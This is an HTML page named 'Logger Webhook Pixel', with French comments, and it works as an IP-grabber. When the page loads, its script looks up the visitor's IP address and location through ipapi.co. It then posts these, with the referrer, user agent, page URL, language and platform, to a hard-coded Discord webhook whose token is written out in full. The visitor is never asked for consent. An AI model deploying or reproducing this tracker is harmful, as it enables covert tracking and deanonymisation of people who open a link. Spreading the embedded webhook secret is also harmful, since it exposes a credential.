<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Logger Webhook Pixel</title>
</head>
<body>
<script>
(async function() {
  // Récupérer la localisation complète via ipapi
  async function getGeoData() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      return {
        ip: data.ip || 'unknown',
        city: data.city || 'unknown',
        country: data.country_name || 'unknown'
      };
    } catch {
      return { ip: 'unknown', city: 'unknown', country: 'unknown' };
    }
  }

  const geo = await getGeoData();

  // Affiche la localisation sur la page
  document.body.insertAdjacentHTML('afterbegin', 
    `<p>Votre IP : ${geo.ip}</p>
     <p>Ville : ${geo.city}</p>
     <p>Pays : ${geo.country}</p>`);

  // Préparer les données à logger
  const logEntry = {
    timestamp: new Date().toISOString(),
    ip: geo.ip,
    city: geo.city,
    country: geo.country,
    referer: document.referrer || 'unknown',
    user_agent: navigator.userAgent || 'unknown',
    additional_info: {
      url: window.location.href,
      path: window.location.pathname,
      search: window.location.search,
      method: 'GET', // côté client, c'est toujours GET
      hostname: window.location.hostname,
      language: navigator.language,
      platform: navigator.platform,
      cookies_enabled: navigator.cookieEnabled
    }
  };

  // Remplacer cette URL par l'URL de ton webhook
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
  console.log(JSON.stringify(logEntry));

  // Envoi des données au webhook
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: "Log entry:\n" + JSON.stringify(logEntry, null, 2)
    })
  });

})();
</script>
</body>
</html>
